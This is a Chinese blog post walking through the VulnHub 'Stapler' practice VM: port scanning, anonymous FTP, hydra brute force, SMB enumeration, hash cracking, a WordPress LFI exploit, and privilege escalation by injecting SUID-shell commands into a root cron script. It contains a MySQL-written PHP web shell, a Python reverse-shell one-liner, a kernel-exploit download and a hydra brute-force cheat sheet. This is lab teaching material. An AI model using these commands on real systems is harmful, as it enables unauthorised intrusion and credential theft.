---
layout: post
title: vulhub stapler
categories: [blog ]
tags: [渗透测试,]
description: "测试"
image:
  feature: windows.jpg
  credit: Azeril
  creditlink: azeril.com
 

---

`测试`

![](/img/swirl/11.jpg)

## vluhub靶场搭建

[Hack the Stapler VM (CTF Challenge) - Hacking Articles](https://www.hackingarticles.in/hack-stapler-vm-ctf-challenge/)

如果导入虚拟机报错

解决方法：编辑Stapler.ovf文件，将文档中所有的`Caption`替换为`ElementName`，保存；再删除Stapler.mf文件；再导入即可

```
在本文中，我们将尝试攻击并获得对 Stapler 的根访问权限：来自 VulnHub 的 1 个挑战。目标是侦察、枚举和利用此易受攻击的计算机来获取 root 访问权限并读取 flag.txt 的内容。我们被告知有各种各样的方法可以做到这一点，但我们已经尝试并找到了最简单的方法。
```

### 前言

为啥要刷这个靶机，因为靶机中涉及的内容提权什么的挺多的，来学习一下。

换成桥接网络，就可以让靶机被扫描到

`nmap -sS -sV -O -p- 192.168.100.45`

![image-20230923201032069](..\img\final\image-20230923201032069.png)

扫描端口

```java
nmap -sS -sV -O -p- 192.168.100.45
nmap -p- -sC --min-rate 5000 192.168.100.45
```

![image-20230923202427879](..\img\final\image-20230923202427879.png)

```python
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain      dnsmasq 2.75
80/tcp    open   http        PHP cli server 5.5 or later
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
```

### 细看端口21

```
nmap -sS -sV -O -A -p21 192.168.100.45
```

发现匿名登陆漏洞

![image-20230923203548030](..\img\final\image-20230923203548030.png)

直接ftp登陆，没密码

![image-20230923204159722](..\img\final\image-20230923204159722.png)

发现里面有一个note文件

![image-20230923204732413](..\img\final\image-20230923204732413.png)

在ftp上get note，就会下载到本地

![image-20230923205739889](..\img\final\image-20230923205739889.png)

```java
┌──(root㉿node1)-[/home/kali]
└─# cat note    
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

再利用hydra工具对FTP服务进行密码爆破

```java
hydra -L user.txt -e nsr 192.168.100.45 ftp
// -L：指定用户名字典
// -e：还可再选的选项，n：null，空密码试探  s：使用与用户名一样的密码试探  r：reverse，使用用户名逆转的密码试探
```

![image-20230923211659726](..\img\final\image-20230923211659726.png)

继续用ftp登陆

```
ftp 192.168.100.45
pwd发现再/目录
get passwd下载下来
```

cat passwd | grep -E "/bin/sh|/bin/bash|/bin/zsh" | cut -d : -f 1  | tee sshuser.txt `选取出有登陆shell的用户`

```
cut -d : -f 1  以冒号为分隔符取出第一个， 也就是用户名
```

![image-20230923214920751](..\img\final\image-20230923214920751.png)

![image-20230923215306513](..\img\final\image-20230923215306513.png)

```
登陆账号 SHayslett进去，发现也是没啥
如果换成22端口，ssh服务
ssh SHayslett@192.168.100.45 也没啥
```

### 端口139：SMB服务

```
SMB服务是一个网络通讯协议，常用于Linux和Windows间的文件共享
```

enum4linux工具用于枚举Windows和Samba主机中的数据

`enum4linux -a 192.168.100.45 | tee smb.txt` // -a：使用所有简单枚举

在结果中发现两个可以连接的共享路径

![image-20230923220509162](..\img\final\image-20230923220509162.png)

利用smbclient工具连进SMB服务

`smbclient -N //192.168.189.130/tmp` // -N：空口令登录

![image-20230923220800325](..\img\final\image-20230923220800325.png)

同样方式进入/kathy

发现了一个txt文档`I'm making sure to backup anything important for Initech, Kathy`

![image-20230923221112055](..\img\final\image-20230923221112055.png)

### 端口666未知服务

对于未知的服务一般用nc来探测，然后发现是一个压缩包里面还有图片

![image-20230924132752053](..\img\final\image-20230924132752053.png)

将数据下载到本地解压，得到一张图片但是目前感觉用处不大

```java
nc 192.168.100.45 666 > 666 && unzip 666
```

![image-20230924133219366](..\img\final\image-20230924133219366.png)

### 端口3306：MySQL服务

nc搞了一下发现只能看出操作系统ubuntu，其他的并没信息

![image-20230924133537882](..\img\final\image-20230924133537882.png)

### 端口12380：HTTP服务

直接访问终于看到页面了

![image-20230924134100917](..\img\final\image-20230924134100917.png)

这里看wp说回想起之前SSH连进去后发现的https目录，尝试用https访问，终于发现靶机的web页面

也就是这里之前ssh连接发现的https

![image-20230924134349654](..\img\final\image-20230924134349654.png)

从ssh中看出https的目录结构

![image-20230924135212609](..\img\final\image-20230924135212609.png)

![image-20230924135433391](..\img\final\image-20230924135433391.png)

![image-20230924135557968](..\img\final\image-20230924135557968.png)

这里获得了mysql数据库的账号密码，直接mysql -u root -p登陆进去，密码可以看到 是经过加密的

![image-20230924141702753](..\img\final\image-20230924141702753.png)

`用hash-identifiter看这是什么加密`

![image-20230924141907278](..\img\final\image-20230924141907278.png)

这里卡住了本来直接用在线网络发现不对，看✌们wp说的是用john解密,rockyou.txt这个不知道是啥（疑惑）

```
john --wordlist=/usr/share/wordlists/rockyou.txt sql1.txt
cd ~/.john
vi john.pot
```

```
账号：john
密码：incorrect
```

![image-20230924142537533](..\img\final\image-20230924142537533.png)

发现John还是一个admin权限

![image-20230924142634192](..\img\final\image-20230924142634192.png)







### 补充

#### nikto工具扫出https

其实这里获得的目录，通过ssh可以直接看到

nikto --host http://192.168.100.45:12380/

![image-20230925101323686](..\img\final\image-20230925101323686.png)

从结果中我们可以看到扫出了SSL证书，说明确实要用https访问，并且结果中还扫出来几个目录

#### wpscan

访问nikto扫出的几个目录，在blogblog页面底部有显示wordpress，我们可以用wpscan工具（专门用来扫wordpress网站）来扫描这个网站（使用前需要先配置API token

```
wpscan --url https://192.168.189.130:12380/blogblog/ --enumerate ap --disable-tls-checks --plugins-detection aggressive| tee wpscan.txt
// --enumerate：枚举信息   ap选项：枚举所有插件
// --disable-tls-checks：忽略TLS检查
// --plugins-detection：使用对应的模式枚举插件   aggressive：主动模式
```

扫描出来插件有LFI漏洞，然后用exp打即可

https://www.exploit-db.com/exploits/39646，然后会在靶机上生成一张图片

```
wget --no-check-certificate https://192.168.189.130:12380/blogblog/wp-content/uploads/130588693.jpeg
```

下载到本地发现就是mysql wp-config.php的内容,也是一种获取数据库账号密码的操作通过漏洞



发现一个能上传的界面

![image-20230925102920316](..\img\final\image-20230925102920316.png)





### 通过定时任务提权

`ll /etc/*cron*`

ssh ppeter@192.168.100.45 -t '/bin/bash' 更好的观看命令

find / -nama logrotate*  2>/dev/null   后面就是说将错误信息不要输出出来

找到 /etc/cron.d/logrotate计划任务

`每五分钟执行一次脚本`

​	![image-20230925104730282](..\img\final\image-20230925104730282.png)

`ls -la /usr/local/sbin/cron-logrotate.sh发现是root权限运行的`

![image-20230925104939564](..\img\final\image-20230925104939564.png)

`echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit" >> /usr/local/sbin/cron-logrotate.sh`



这里能修改定时文件中运行的脚本是因为，

`ll /usr/local/sbin/cron-logrotate.sh  `

脚本权限为 rwx可写所以能修改

![image-20230925110806532](..\img\final\image-20230925110806532.png)

```
echo "cp /bin/bash /tmp/cronroot; chown root:root /tmp/cronroot; chmod u+s /tmp/cronroot" > /usr/local/sbin/cron-logrotate.sh
```

直接/tmp/cronroot -p获取root权限（也就是suid提权中的bash -p)

![image-20230925111304327](..\img\final\image-20230925111304327.png)

### 提权：CVE-2016-4557 内核漏洞提权

获取shell后，查看系统内核和发行版信息

``` 
uname -a  //系统内核
lsb_release -a    //发行版信息
```

![image-20230925111914050](..\img\final\image-20230925111914050.png)

得知内核版本为4.4.0-21-generic ，发行版为16.04LTS,利用CVE提权

```java
wget https://gitee.com/novaiminipekka/exploitdb-bin-sploitsss/raw/master/bin-sploits/39772.zip
unzip 39772.zip
```

我们需要将其中的exploit.tar上传到靶机中，利用python在kali中起一个http服务

![image-20230925112708454](..\img\final\image-20230925112708454.png)

![image-20230925112804507](..\img\final\image-20230925112804507.png)

## 通过MySQL写马获得shell

```mysql
mysql -h192.168.189.130 -uroot -pplbkac
MySQL [(none)]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/https/blogblog/wp-content/uploads/mysqlshell.php";
```

然后通过页面直接调用python命令反弹shell

```
cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.189.129",2334));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image-20230925113149287](..\img\final\image-20230925113149287.png)







## hydra

```
# hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]
[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]
参数介绍:
-R     继续从上一次进度接着破解
-S     大写，采用SSL链接
-s<PORT>     小写，可通过这个参数指定非默认端口
-l<LOGIN>     指定破解的用户，对特定用户破解
-L<FILE>     指定用户名字典
-p<PASS>     小写，指定密码破解，少用，一般是采用密码字典
-P<FILE>     大写，指定密码字典
-e<ns>     可选选项，n：空密码试探，s：使用指定用户和密码试探
-C<FILE>     使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数
-M<FILE>     指定目标列表文件一行一条
-o<FILE>     指定结果输出文件
-f     在使用-M参数以后，找到第一对登录名或者密码的时候中止破解
-t<TASKS>     同时运行的线程数，默认为16
-w<TIME>     设置最大超时的时间，单位秒，默认是30s
-v /-V     显示详细过程
```



```
各协议爆破命令实例
1、爆破SSH
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh


2、爆破FTP
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV


3、爆破SMB
hydra -l administrator -P pass.txt 192.168.0.2 smb


4、爆破rdp
hydra ip rdp -l administrator -P pass.txt -V


5、爆破POP3
hydra -l muts -P pass.txt my.pop3.mail pop3


6、爆破http-proxy
hydra -l admin -P pass.txt http-proxy://192.168.0.2


7、爆破web表单
hydra -l 用户名 -P 密码字典 -s 80 域名 http-post-form"/admin/login.php:username=^USER^&password=^PASS^:<密码错误的时候的报错>"
```

